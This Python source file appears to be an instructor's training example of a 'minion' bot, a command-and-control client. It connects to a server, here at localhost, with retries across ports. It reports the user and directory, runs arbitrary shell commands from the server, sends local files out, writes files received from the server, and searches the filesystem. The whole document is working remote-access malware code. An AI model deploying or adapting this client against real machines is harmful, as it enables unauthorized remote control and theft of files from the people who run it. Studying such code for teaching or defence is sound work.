# Name: MSgt Robert Hendrickson
# ID:   instructor05
# DATE: 7 OCT 2021
"""
This program will create a bot and call to a server for commands
USAGE: ~$ python3 Hendrickson_Minoin.py
socket module used for send/recieve to server
subprocess module used to send commands to system
re module/happy_little_searcher used to find files on system
os module used to walk through filesystem
getpass module required to get the username of the client connection
time module used to pause between connection attempts
PSUEDOCODE in Hendrickson_Minion.txt
"""
import socket
import subprocess
import base64
import re
import os
import getpass
import sys
import time

# we gather the starting location to use when we search for a file later
start_loc = os.getcwd()

def mysendall(socket, data, delimiter):
    """
    This is a send function for sending encoded information to server
    :socket: the socket object used for communication to the server
    :data: the information that is being sent to the server
    :delimiter: a string that will signify the end of data
    :E_data: the encoded data to send to the server
    First we encode the data then we send the data through the socket
    and return the response.
    """
    E_data = base64.b64encode(data) + delimiter
    return socket.sendall(E_data)

def myrecvall(socket, delimiter):
    """
    This is a recieve function that will decode data from the server
    :socket: the socket object used for communication to the server
    :delimiter: a string that will signify the end of the file
    :data: the data that is being recieved from the server
    :size: an integer that is the data buffer size for our recieve loop
    :D_data: the base64 decoded data from the server
    """
    data = b''
    while not data.endswith(delimiter):
        data += socket.recv(4096)
    D_data = base64.b64decode(data[:-len(delimiter)])
    return D_data

def download(socket, delimiter):
    """
    This function will recieve a filename request from the server
    and send the file to the server.
    :socket: socket object for the server
    :filename: filename from the server
    :handle: the file name variable
    :data: the information to send to the server
    """
    # Send the server a message about the file name
    data = b"[!] Ready for file name."
    mysendall(socket, data, delimiter)
    # Save response from server in variable
    filename = myrecvall(socket, delimiter).decode()
    # Set up exception handling if there is an error reading the file
    # or if the file cannot be found
    try:
        with open(filename, 'r') as handle:
            data = handle.read()
    except Exception as e:
        # Set up the message to send to the server
        data = '[!] ERROR: \nTried to open '+filename+'\nReceived Error: '+str(e)
        data = data.encode()
        mysendall(socket, data, delimiter)
    else:
        # If no error we will save the base64 encoded file to a variable
        # and send that to the server for writing on the server
        mysendall(socket, data, delimiter)
        # Sync with the server to prevent hang in commands
        myrecvall(socket, delimiter).decode()
        # Now we send that it is complete
        data = b'[!] Client command complete'
        mysendall(socket, data, delimiter)

def search(socket, delimiter):
    """
    This function will search the filesystem for a file specified
    if no file is specified it will use the default search pattern
    :filepath: the place to start the search for a file
    :known: if the filename is know or unknown
    :name: the name of the file
    :results: the results of the search exspressivesearch function
    :E_results: the base64 encoded results of the function
    :Expressive Search: a module that takes a filepath, a boolean, and
                        filename and searches the file system for that file
                        if found it will provide a md5 hash of the file.
    """
    # we will check the current directory for the happy_little_searcher module
    if 'search' not in os.listdir():
        # now we we add the starting location to path the script is running from
        sys.path.append(start_loc)
        # Now we import the search
        import happy_little_searcher
    else:
        # If the file is in the dir listing import the file
        import happy_little_searcher
    # First we will recieve the filepath from the server
    filepath = myrecvall(socket, delimiter).decode()
    # Now we will send that we recieved the file path to start the search
    data = b'[!] File path recieved at client'
    # Third we call the send function  to send the message
    mysendall(socket, data, delimiter)
    # Now we see if the filename is known or not
    known = myrecvall(socket, delimiter).decode() 
    if 'y' in known: 
        # Will check the value above, if y is in known it will 
        # send ready for file name, if unknown if will send the 
        # other message
        known = True
        data = b'[!] Ready for file name'
        # We let the server know we are ready for the file name
        mysendall(socket, data, delimiter)
        # We recieve, decode, and strip the file name
        name = myrecvall(socket, delimiter).decode().strip()
    else:
        # We are preparing a few variables to send to the server
        known = False
        name = False
        # We are telling the server that we will use the default regular expression
        data = b'[!] No file name, using default pattern'
        mysendall(socket, data, delimiter)
        # now we 
        myrecvall(socket, delimiter).decode()
    # We will save the results of the search function to a variable
    try:
        results = happy_little_searcher.searcher(filepath, known, name).encode()
    except Exception as e:
        # If an exception occurs we send the error to the server
        data = '[!] ERROR: '+str(e)
        mysendall(socket, data.encode(), delimiter)
        # We recieve the server resonse
        myrecvall(socket, delimiter).decode()
        # We send the server the fail message
        data = b'[!] Client command failed'
        mysendall(socket, data, delimiter)
    else:
        # we will now send the results of the search back to the server 
        mysendall(socket, results, delimiter)
        # We sync with the server to prevent a hang after a large file
        myrecvall(socket, delimiter).decode()
        # We send command is complete
        data = b'[!] Client command complete'
        mysendall(socket, data, delimiter)
    

def upload(socket, delimiter):
    """
    This function will recieve a file from the server and save it to the
    local file system
    :data: the information to send the server
    :targetname: the name of the location for the file.
    :D_recvd: the decoded file contents
    :handle: the file object
    """
    # First we recieve the target filename
    targetname = myrecvall(socket, delimiter).decode().strip()
    # Next we tell the server we are ready for file content
    data = b'[!] Ready for file contents.'
    mysendall(socket, data, delimiter)
    # We save the file contents from the server into a variable
    D_recvd = myrecvall(socket, delimiter).decode()
    # We set up exception handling if there is an error writing
    # the new file
    try:
        # We use the name recieved and write the file 
        with open(targetname, 'w') as handle:
            # We are writing the contents we recieved earlier 
            handle.write(D_recvd)
    except Exception as e:
        # send the error or file uploaded
        data = '[!] ERROR: \n'+str(e)
        # we encode the error
        data = data.encode()
        # we send the error accross the socket
        mysendall(socket, data, delimiter)
        # we recieve the server message
        myrecvall(socket, delimiter).decode()
        # We send our fail message
        data = b'[!] Client command failed'
        mysendall(socket, data, delimiter)
    else:
        # If there are no exceptions we tell the server the file was uploaded to the location
        data = '[!] File uploaded to client at: {}'.format(targetname)
        # the data must be byte encoded
        data = data.encode()
        # now we send our encoded bytes
        mysendall(socket, data, delimiter)
        # We recieve the server response
        myrecvall(socket, delimiter).decode()
        # We tell the server that the command is complete
        data = b'[!] Client command complete'
        # Now we send command complete to the server
        mysendall(socket, data, delimiter)

def main():
    """
    This function will establish a connection with the server 
    and run shell commands that are recieved from the server
    :ip: the server ip
    :port: the port to connect to on the server
    :delimiter: the delimiter to append to the end of all commands
                and files sent accross the connection
    :mysocket: the socket connection to the server
    """
    # This is setting up the client to communicate with the server
    ip = '127.0.0.1'
    ports = [8888, 7777, 6666, 5555]
    delimiter = b'!!@@##$$!!'
    # This is the socket object that will connect to the server
    mysocket = socket.socket()
    # initialize a connection loop to continuously try connecting
    connected = False
    while not connected:
        for port in ports:
            time.sleep(1)
            try:
                mysocket.connect((ip, port))
            except socket.error:
                continue
            else:
                connected = True
                break
    # Initialize the loop to handle bot commands
    while True:
        # We first get our username and  working directory
        user = getpass.getuser()
        user_dir = os.getcwd()
        data = user+';'+user_dir
        data = data.encode()
        # We send the information to the server
        mysendall(mysocket, data, delimiter)
        # We recieve a command, then if it matches a key word
        # complete the appropriate action
        command = myrecvall(mysocket, delimiter).decode()
        if command[:4] == 'quit':
            # if quit is recieved break loop and terminate connection to server
            break
        elif command[:8] == 'download':
            # If download is recieved, run download function
            download(mysocket, delimiter)
            # go back to beginning of loop
            continue
        elif command[:6] == 'search':
            # If search is recieved, run search function
            search(mysocket, delimiter)
            # go back to beginning of loop
            continue
        elif command[:6] == 'upload':
            # If upload is recieved run upload function
            upload(mysocket, delimiter)
            # go back to beginning of loop
            continue
        elif command[:7] == 'command':
            # If command is recieved run command using subprocess module
            # First we tell the server we are ready
            data = b'[!] Client ready for command'
            mysendall(mysocket, data, delimiter)
            # Now we get the command from the server
            command = myrecvall(mysocket, delimiter).decode()
            # If the command is cd we need to use the os.chdir command
            if 'cd' in command:
                # We need exception handling for a cd command, if there is no directory then send the error
                try:
                    # We split the string on a space, and set the value of the second item to our location
                    commandloc = command.split(' ')[1]
                except IndexError as ie:
                    # We tell the server we are switching to the default directory
                    data = b'[!] Changing to default directory'
                    mysendall(mysocket, data, delimiter)
                    # We do a conditional based on the platform the script is running in
                    if 'linux' in sys.platform:
                        # Now we change to the home directory
                        os.chdir('/home/{}'.format(user))
                    elif 'win32' in sys.platform or 'win64' in sys.platform:
                        os.chdir('C:\\Users\\{}'.format(user))
                    # Now we sync the server with the client
                    myrecvall(mysocket, delimiter).decode()
                    # Now we tell the server that it failed
                    data = '\n[!] Changed directory to: {}'.format(os.getcwd())
                    mysendall(mysocket, data.encode(), delimiter)
                except Exception as e:
                    # We tell the server there was no directory provided
                    data = '[!] ERROR: '+str(e)
                    data = data.encode()
                    mysendall(mysocket, data, delimiter)
                    # Now we sync the server with the client
                    myrecvall(mysocket, delimiter).decode()
                    # Now we tell the server that it failed
                    data = b'\n[!] Client command failed'
                    mysendall(mysocket, data, delimiter)
                else:    
                    # If there is no error 
                    # We use the change dir command to the specified place
                    os.chdir(commandloc)
                    # We send back that the dir is changed to the new location
                    data = b'[!] Successfully changed directories'
                    mysendall(mysocket, data, delimiter)
                    # Now we sync the information from the server
                    myrecvall(mysocket, delimiter).decode()
                    # Now we send that the command is complete
                    data = b'\n[!] Client command complete'
                    mysendall(mysocket, data, delimiter)
            else:
                # Now input that command in to a variable that is the
                # results from subprocess.Popen function
                proc = subprocess.Popen(command,
                                       shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                # save the command output and errors to variables
                output, errors = proc.communicate()
                # Check if our output is empty
                if not len(output):
                    # If empty tell the server there is no output
                    output = b'[!] No command output at client\n'
                # combine the bytes objects from the previous steps
                results = output+errors
                # now we send the results to the server
                mysendall(mysocket, results, delimiter)
                # now we need to wait for a server next message
                myrecvall(mysocket, delimiter).decode()
                # now we send that the command completed
                data = b"[!] Client command complete"
                mysendall(mysocket, data, delimiter)
                # go back to beginning of loop
            continue

if __name__ == "__main__":
    main()
